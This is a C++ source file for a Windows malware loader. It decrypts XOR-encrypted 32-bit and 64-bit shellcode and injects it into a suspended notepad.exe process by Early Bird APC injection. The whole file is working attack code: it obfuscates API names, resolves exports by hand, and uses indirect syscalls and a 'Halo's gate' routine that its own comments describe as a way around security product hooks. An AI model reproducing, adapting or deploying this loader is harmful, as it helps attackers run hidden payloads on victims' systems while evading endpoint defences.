#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "masterwizard.h"
/*
    g++ -s -fmerge-all-constants masterwizard.cpp masterwizard.o -o masterwizard.exe 
*/

//============== Obfuscated Vars ================
UCHAR _NtAllocateVirtualMemory[] = { 0x3c, 0x0e, 0x25, 0x04, 0x03, 0x1f, 0x3c, 0x08, 0x07, 0x3a, 0x37, 0x36, 0x1c, 0x1d, 0x16, 0x04, 0x33, 0x2a, 0x10, 0x14, 0x1d, 0x08, 0x1d, 0x68 };
UCHAR _NtWriteVirtualMemory[] = { 0x3c, 0x0e, 0x33, 0x1a, 0x06, 0x04, 0x3a, 0x3f, 0x1a, 0x2d, 0x15, 0x2a, 0x0f, 0x05, 0x2e, 0x00, 0x32, 0x08, 0x07, 0x00, 0x72 };
UCHAR _NtCreateThreadEx[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x27, 0x37, 0x13, 0x3a, 0x0f, 0x0d, 0x26, 0x1d, 0x5f };
UCHAR _NtProtectVirtualMemory[] = { 0x3c, 0x0e, 0x34, 0x1a, 0x00, 0x04, 0x3a, 0x0a, 0x07, 0x09, 0x08, 0x2d, 0x1a, 0x1c, 0x02, 0x09, 0x12, 0x02, 0x18, 0x16, 0x00, 0x03, 0x64 };
UCHAR _NtResumeThread[] = { 0x3c, 0x0e, 0x36, 0x0d, 0x1c, 0x05, 0x32, 0x0c, 0x27, 0x37, 0x13, 0x3a, 0x0f, 0x0d, 0x63 };
UCHAR _VirtualFreeEx[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x2f, 0x01, 0x3a, 0x04, 0x1a, 0x16, 0x69 };
UCHAR _VirtualAllocExNuma[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x28, 0x1f, 0x33, 0x0e, 0x3c, 0x2b, 0x11, 0x2d, 0x10, 0x32, 0x06, 0x75 };
UCHAR _NtWaitForSingleObject[] = { 0x3c, 0x0e, 0x33, 0x09, 0x06, 0x04, 0x19, 0x06, 0x01, 0x0c, 0x08, 0x31, 0x09, 0x05, 0x06, 0x2a, 0x3d, 0x0d, 0x10, 0x1a, 0x06, 0x7a };
UCHAR _NtQueueApcThread[] = { 0x3c, 0x0e, 0x35, 0x1d, 0x0a, 0x05, 0x3a, 0x28, 0x03, 0x3c, 0x35, 0x37, 0x1c, 0x0c, 0x02, 0x01, 0x5f };
UCHAR shellcode_32[] = { 0x8e, 0x92, 0xeb, 0x68, 0x6f, 0x70, 0x3f, 0x58, 0xa1, 0xd6, 0x84, 0x3b, 0xe5, 0x3b, 0x53, 0xee, 0x0d, 0x6b, 0xfe, 0x2b, 0x66, 0x75, 0xd3, 0x22, 0x49, 0xfb, 0x2d, 0x41, 0x42, 0xa0, 0x50, 0x9f, 0xc2, 0x55, 0x02, 0x19, 0x5d, 0x4b, 0x55, 0xb8, 0xbd, 0x77, 0x65, 0xaf, 0x26, 0x05, 0xb0, 0x3b, 0x24, 0xd4, 0x33, 0x4f, 0xe5, 0x2b, 0x5f, 0x64, 0x8f, 0xec, 0x35, 0x01, 0xf7, 0xba, 0x10, 0x24, 0x6e, 0xa0, 0xd4, 0x31, 0x53, 0x5e, 0xb2, 0xd4, 0x26, 0x71, 0x33, 0xe0, 0x96, 0x13, 0x49, 0x30, 0xf9, 0x4e, 0xef, 0x59, 0x90, 0x71, 0x89, 0x58, 0xb3, 0xf3, 0xa0, 0x90, 0x63, 0x68, 0xa4, 0x5d, 0xbf, 0x12, 0x81, 0x7a, 0x0f, 0x82, 0x5f, 0x15, 0x4b, 0x05, 0xbf, 0x31, 0xf8, 0x07, 0x45, 0x5e, 0xbd, 0x0f, 0xe8, 0x69, 0x14, 0xec, 0x2d, 0x65, 0x73, 0xa9, 0xef, 0x6c, 0xe4, 0x71, 0x8f, 0xe0, 0x37, 0x7b, 0x45, 0x04, 0x35, 0x08, 0x3a, 0x3f, 0x0e, 0x98, 0x95, 0x21, 0x2d, 0x20, 0xef, 0x7a, 0x86, 0xf0, 0xa0, 0x96, 0x8c, 0x02, 0x89, 0x54, 0x6e, 0x69, 0x63, 0x10, 0x2c, 0x02, 0x07, 0x4a, 0x40, 0x54, 0x00, 0x04, 0x03, 0x70, 0x37, 0x25, 0x04, 0x79, 0x66, 0xa0, 0xbb, 0x03, 0x63, 0x8d, 0x59, 0x67, 0x75, 0x79, 0x22, 0x0d, 0x0a, 0x0d, 0x0b, 0x70, 0xb7, 0x78, 0x73, 0x5f, 0x61, 0x16, 0x00, 0x03, 0x06, 0x06, 0x2b, 0x02, 0x11, 0x59, 0x10, 0x03, 0x44, 0x3a, 0x06, 0x14, 0x3e, 0x69, 0x19, 0x5f, 0x09, 0x1a, 0xed, 0x3f, 0x64, 0x9a, 0x8a, 0xdc, 0x95, 0x64, 0x58, 0x70, 0x0c, 0xce, 0xfa, 0xcd, 0xc2, 0x96, 0xa6, 0xdc, 0xa5, 0x77, 0x52, 0x6f, 0x1f, 0x6f, 0xdf, 0x9c, 0x95, 0x0c, 0x77, 0xc1, 0x23, 0x7b, 0x1d, 0x1f, 0x35, 0x69, 0x20, 0xa0, 0xb4 };
UCHAR shellcode_64[] = { 0x8e, 0x32, 0xe5, 0x8c, 0x9f, 0x8f, 0xa0, 0x96, 0x9b, 0x93, 0x61, 0x5f, 0x6e, 0x28, 0x32, 0x24, 0x0f, 0x35, 0x3d, 0x48, 0xa0, 0x2b, 0x32, 0x0d, 0x27, 0xfb, 0x0d, 0x09, 0x3b, 0xd4, 0x33, 0x47, 0x26, 0xe2, 0x31, 0x45, 0x17, 0xec, 0x07, 0x29, 0x3a, 0x75, 0xd3, 0x22, 0x25, 0x3d, 0x6e, 0xa0, 0x3b, 0x6e, 0xa1, 0xf3, 0x52, 0x08, 0x1f, 0x67, 0x73, 0x47, 0x34, 0xb8, 0xbb, 0x77, 0x25, 0x69, 0xae, 0x92, 0xb2, 0x3b, 0x3b, 0xd4, 0x33, 0x7f, 0x2f, 0x38, 0xe8, 0x27, 0x63, 0x2f, 0x74, 0xa9, 0x14, 0xfb, 0x1c, 0x70, 0x64, 0x72, 0x50, 0xec, 0x01, 0x5f, 0x61, 0x5f, 0xe5, 0xe9, 0xeb, 0x65, 0x5f, 0x67, 0x3d, 0xfc, 0xb2, 0x0e, 0x03, 0x20, 0x6e, 0xa0, 0x0f, 0x2d, 0xf8, 0x1f, 0x41, 0xd4, 0x26, 0x71, 0x2a, 0x64, 0x8f, 0x84, 0x23, 0x31, 0x8d, 0xb3, 0x25, 0xe3, 0x5b, 0xf8, 0x17, 0x68, 0xa5, 0x12, 0x50, 0x96, 0x26, 0x58, 0xa3, 0x24, 0x9e, 0xae, 0x78, 0xd5, 0x33, 0x7b, 0xa5, 0x50, 0x8f, 0x05, 0xae, 0x25, 0x70, 0x13, 0x45, 0x57, 0x2b, 0x50, 0xb2, 0x10, 0x87, 0x3f, 0x31, 0xf2, 0x32, 0x5e, 0x2d, 0x69, 0xbf, 0x16, 0x1e, 0xe2, 0x7f, 0x17, 0x25, 0xd4, 0x2e, 0x75, 0x2a, 0x64, 0x8f, 0x26, 0xfe, 0x7d, 0xfa, 0x32, 0x65, 0xb8, 0x2e, 0x28, 0x1e, 0x31, 0x2d, 0x06, 0x3b, 0x1e, 0x36, 0x28, 0x3a, 0x24, 0x05, 0x2f, 0xf6, 0x95, 0x52, 0x3b, 0x36, 0x97, 0x8f, 0x28, 0x1e, 0x30, 0x29, 0x17, 0xea, 0x4d, 0x87, 0x22, 0x9c, 0x9a, 0xa0, 0x3a, 0x9d, 0x72, 0x72, 0x7a, 0x64, 0x1d, 0x1c, 0x15, 0x2d, 0x5a, 0x41, 0x71, 0x05, 0x33, 0x02, 0x69, 0x3a, 0x24, 0xe5, 0x2b, 0x02, 0x5f, 0x75, 0x85, 0xb1, 0x21, 0xa8, 0xb1, 0x5f, 0x69, 0x73, 0x5f, 0x89, 0x4e, 0x6e, 0x69, 0x63, 0x2c, 0x31, 0x0d, 0x10, 0x1a, 0x06, 0x1f, 0x00, 0x48, 0x0d, 0x09, 0x7f, 0x3b, 0x1a, 0x3b, 0x00, 0x5f, 0x34, 0x81, 0x65, 0x65, 0x5f, 0x67, 0x25, 0x0e, 0x1c, 0x1f, 0x00, 0x68, 0x2e, 0x28, 0x17, 0x58, 0xba, 0x1e, 0xdb, 0x1a, 0xed, 0x3f, 0x64, 0x9a, 0x8a, 0xdc, 0x95, 0x64, 0x58, 0x70, 0x25, 0xd2, 0xc9, 0xe5, 0xe2, 0xf4, 0x8c, 0x8a, 0x29, 0xdc, 0xaa, 0x41, 0x5f, 0x63, 0x23, 0x6d, 0xf5, 0x82, 0x92, 0x0f, 0x61, 0xd3, 0x28, 0x63, 0x2d, 0x06, 0x19, 0x5f, 0x38, 0x1e, 0xe7, 0xb3, 0x9c, 0xb0 };
UCHAR key[] = { 0x72, 0x7a, 0x64, 0x68, 0x6f, 0x70, 0x5f, 0x69, 0x73, 0x5f, 0x61, 0x5f, 0x6e, 0x69, 0x63, 0x65, 0x5f, 0x67, 0x75, 0x79 };
//===============================================

void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz){
    for (int i = 0; i < data_sz; i++){
        data[i] = data[i] ^ key[i%key_sz];
    }
}

FARPROC __stdcall MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PBYTE pBase = (PBYTE) hModule;

    //Cast DOS header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

    //Get NTHeader ptr from DOS header
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

    //Get Optionalheader for NTHeader
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    //get _IMAGE_EXPORT_DIRECTORY addr from opt hdr
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    /*
    typedef struct _IMAGE_EXPORT_DIRECTORY {
        DWORD   Characteristics;
        DWORD   TimeDateStamp;
        WORD    MajorVersion;
        WORD    MinorVersion;
        DWORD   Name;
        DWORD   Base;
        DWORD   NumberOfFunctions;
        DWORD   NumberOfNames;
        DWORD   AddressOfFunctions;     // RVA from base of image
        DWORD   AddressOfNames;         // RVA from base of image
        DWORD   AddressOfNameOrdinals;  // RVA from base of image
    } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
    */
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++){
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        if (strcmp(pFunctionName, lpProcName) == 0) {
            WORD wFunctionOrdinal = FunctionOrdinalArray[i];
            PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}

BOOL isWow64(HANDLE hProcess) {
    BOOL bIsWow64 = FALSE;

    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)MyGetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if (fnIsWow64Process) {
        fnIsWow64Process(hProcess, &bIsWow64);
    }

    return bIsWow64;
}

LPVOID Halo_gate(HMODULE hNtdll){
    LPVOID stub = nullptr;
    BYTE* textBase = nullptr;
    DWORD textSize = 0;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            textBase = (BYTE*)hNtdll + sec->VirtualAddress;
            textSize = sec->Misc.VirtualSize;
            break;
        }
    }

    BYTE* looker = textBase;
    for (int _ = 0; _ < textSize; _++) {
        looker++;
        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xB8) {
            //stub normal => on trouve "syscall" (0x0F 0x05)
            if (looker[0x12] == 0x0F && looker[0x13] == 0x05) {
                stub = looker + 0x12; // direct vers le syscall
                printf("\t[*] Found syscall with Halo's gate [0F 05] !\n");
                break;
            }
        }
    }

    return stub;
}

DWORD dynamicSSN_retreive(BYTE* NtFunctionAddr) {
    DWORD SSN = 0;
    int lookerField = 0x500;   // fenêtre de scan en arrière (bytes)
    int steps = 0;

    if (!NtFunctionAddr) return 0;

    // Sécuriser les bornes de lecture (resterdans la même région mémoire)
    MEMORY_BASIC_INFORMATION mbi{};
    if (!VirtualQuery(NtFunctionAddr, &mbi, sizeof(mbi))) return 0;
    BYTE* regionBase = (BYTE*)mbi.BaseAddress;
    BYTE* regionEnd  = (BYTE*)mbi.BaseAddress + mbi.RegionSize;

    BYTE* lowerBound = NtFunctionAddr - lookerField;
    if (lowerBound < regionBase) lowerBound = regionBase;

    BYTE* looker = NtFunctionAddr;

    while (looker >= lowerBound) {
        // On s'assure qu'on peut lire au moins les 8 bytes (signature + imm32)
        // (Qu'on reste bien dans la meme région)
        if (looker + 7 >= regionEnd) {
            looker--; 
            continue;
        }

        // stub clean: 4C 8B D1 B8 xx xx xx xx (mov r10, rcx; mov eax, imm32)
        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xB8) {
            SSN = (*(DWORD*)(looker + 4)) + (DWORD)steps;
            printf("\t[*] yaay found SSN : 0x%x w/ %d steps\n", SSN, steps);
            break;
        }

        // stub hooké "jmp rel32": 4C 8B D1 E9 ....
        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xE9) {
            steps++;
        }

        looker--;
    }

    return SSN;
}

DWORD getInDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName, PSYSCALL_STUB sstub){
    DWORD SSN = 0;
    LPVOID stub = NULL;
    BYTE* NtFunctionAddr = (BYTE*)MyGetProcAddress(hNTDLL, NtFunctionName);

    if (!NtFunctionAddr) return SSN;
    //Case si on a le SSN mais pas le syscall
    if (NtFunctionAddr[0] == 0x4C && NtFunctionAddr[1] == 0x8B && NtFunctionAddr[2] == 0xD1 && NtFunctionAddr[3] == 0xB8) {
        printf("[+] Function %s @ 0x%p\n", NtFunctionName, NtFunctionAddr);
        SSN = *(DWORD*)((BYTE*)NtFunctionAddr + 4);

        // stub normal => on trouve "syscall" (0x0F 0x05)
        if (NtFunctionAddr[0x12] == 0x0F && NtFunctionAddr[0x13] == 0x05) {
            stub = NtFunctionAddr+0x12; // direct vers le syscall
            printf("\t[*] Found syscall [0F 05] !\n");
        } else {
            printf("[*] %s may be hooked by a security!\n", NtFunctionName);
            printf("[*] Let's do a magic trick!\n");
            stub = Halo_gate(hNTDLL);
             
        }
    //case si on a pas de SSN (on aura pas de syscall non plus lol)
    } else { 
        printf("[-] Unexpected stub format for %s!\n", NtFunctionName);
        printf("[-] SSN not found!\n");
        printf("[-] Trying dynamic SSN retrival\n");
        SSN = dynamicSSN_retreive(NtFunctionAddr);
        stub = Halo_gate(hNTDLL);
    }

    printf("\t[+] %s stub : SSN 0x%x\n", NtFunctionName, SSN);
    printf("\t[+] %s stub : syscall @ 0x%p\n", NtFunctionName, stub);

    sstub->SyscallId = SSN;
    sstub->SyscallFunc = stub;
    return SSN;
}

void CreateEarlyBird(char *lpPath, PHANDLE hProcess, PHANDLE hThread, PDWORD dwProcessId) {
    STARTUPINFOA Si = {0};
	PROCESS_INFORMATION Pi = {0};

    memset(&Si, 0, sizeof(STARTUPINFO));
    memset(&Pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
		printf("[-] CreateProcessA Failed  : %d \n", GetLastError());
		return;
	}
    
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;
    *dwProcessId = Pi.dwProcessId;
}

int injectProc(){
    int is64 = 0;

    PUCHAR shellcode = nullptr;
    SIZE_T scSize = 0;

    HMODULE hNtdll = GetModuleHandle(TEXT("ntdll.dll"));

    char lpProcessName[] = "notepad.exe";
    char lpPath[666];
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;

    sprintf(lpPath, "C:\\windows\\System32\\%s", lpProcessName);
    printf("\n[+] Starting EarlyBird with CREATE_SUSPENDED flag : \"%s\" ... \n", lpPath);

    CreateEarlyBird(lpPath, &hProcess, &hThread, &dwProcessId);
    printf("[*] hProcess %p | hThread %p | dwProcessId %d\n", hProcess, hThread, dwProcessId);

    if (!isWow64(hProcess)) {
        is64 = 1;
        XOR(shellcode_64, sizeof(shellcode_64), key, sizeof(key));
        shellcode = shellcode_64;
        scSize = sizeof(shellcode_64);
    } else {
        XOR(shellcode_32, sizeof(shellcode_32), key, sizeof(key));
        shellcode = shellcode_32;
        scSize = sizeof(shellcode_32);
    }

    SYSCALL_STUB vaeStub = { 0 };
    getInDirectSyscallStub(hNtdll, (LPCSTR)_NtAllocateVirtualMemory, &vaeStub);
    g_SSN_NtAllocateVirtualMemory = vaeStub.SyscallId;
    g_SYSADDR_NtAllocateVirtualMemory = vaeStub.SyscallFunc;

    LPVOID memPoolPtr;
    if (stubNtAllocateVirtualMemory(hProcess, &memPoolPtr, 0, &scSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) {
        printf("[-] NtAllocateVirtualMemory Failed !\n");
        return 1;
    }
    Sleep(534);
    //LPVOID memPoolPtr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode_64), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);

    SYSCALL_STUB wpmStub = { 0 };
    getInDirectSyscallStub(hNtdll, (LPCSTR)_NtWriteVirtualMemory, &wpmStub);
    g_SSN_NtWriteVirtualMemory = wpmStub.SyscallId;
    g_SYSADDR_NtWriteVirtualMemory = wpmStub.SyscallFunc;
    ULONG bw = 0;

    if (stubNtWriteVirtualMemory(hProcess, memPoolPtr, shellcode, scSize, &bw)) {
        printf("[-] NtWriteVirtualMemory Failed !\n");
        return 1;
    }

    //WriteProcessMemory(hProcess, memPoolPtr, shellcode_64, sizeof(shellcode_64), NULL);
    printf("[+] Shellcode %s written\n", is64 ? "64bit" : "32bit");
    
    DWORD oldProt = 0;
    SYSCALL_STUB virpctSub = { 0 };
    getInDirectSyscallStub(hNtdll, (LPCSTR)_NtProtectVirtualMemory, &virpctSub);
    g_SSN_NtProtectVirtualMemory = virpctSub.SyscallId;
    g_SYSADDR_NtProtectVirtualMemory = virpctSub.SyscallFunc;
    //if (stubNtProtectVirtualMemory()) {
    //    printf("[-] NtProtectVirtualMemory Failed !\n");
    //    return 1;
    //}
    VirtualProtectEx(hProcess, memPoolPtr, scSize, PAGE_EXECUTE_READ, &oldProt);
    Sleep(219);

    SYSCALL_STUB apcStub = { 0 };
    getInDirectSyscallStub(hNtdll, (LPCSTR)_NtQueueApcThread, &apcStub);
    g_SSN_NtQueueApcThread = apcStub.SyscallId;
    g_SYSADDR_NtQueueApcThread = apcStub.SyscallFunc;

    if (stubNtQueueApcThread(hThread, memPoolPtr, 0, 0, 0)) {
        printf("[-] NtQueueApcThread Failed !\n");
        return 1;
    }
    printf("[+] APC Queued.\n");
    
    SYSCALL_STUB rtStub = { 0 };
    getInDirectSyscallStub(hNtdll, (LPCSTR)_NtResumeThread, &rtStub);
    g_SSN_NtResumeThread = rtStub.SyscallId;
    g_SYSADDR_NtResumeThread = rtStub.SyscallFunc;
    //ResumeThread(hThread);
    if (stubNtResumeThread(hThread, NULL)) {
        printf("[-] NtQueueApcThread Failed !\n");
        return 1;
    }
    printf("[+] Thread resumed, waiting for APC execution...\n");

    SYSCALL_STUB wfsoStub = { 0 };
    getInDirectSyscallStub(hNtdll, (LPCSTR)_NtWaitForSingleObject, &wfsoStub);
    g_SSN_NtWaitForSingleObject = wfsoStub.SyscallId;
    g_SYSADDR_NtWaitForSingleObject = wfsoStub.SyscallFunc;
    //WaitForSingleObject(hThread, INFINITE);
    if (stubNtWaitForSingleObject(hThread, FALSE, NULL)) {
        printf("[-] NtQueueApcThread Failed !\n");
        return 1;
    }
    
    printf("[+] APC done.\n");


    VirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int main(int argc, char **argv){
    XOR(_NtAllocateVirtualMemory, sizeof(_NtAllocateVirtualMemory), key, sizeof(key));
    XOR(_NtWriteVirtualMemory, sizeof(_NtWriteVirtualMemory), key, sizeof(key));
    XOR(_NtProtectVirtualMemory, sizeof(_NtProtectVirtualMemory), key, sizeof(key));
    XOR(_NtResumeThread, sizeof(_NtResumeThread), key, sizeof(key));
    XOR(_VirtualFreeEx, sizeof(_VirtualFreeEx), key, sizeof(key));
    XOR(_VirtualAllocExNuma, sizeof(_VirtualAllocExNuma), key, sizeof(key));
    XOR(_NtWaitForSingleObject, sizeof(_NtWaitForSingleObject), key, sizeof(key));
    XOR(_NtQueueApcThread, sizeof(_NtQueueApcThread), key, sizeof(key));

    injectProc();
    return 0;
}
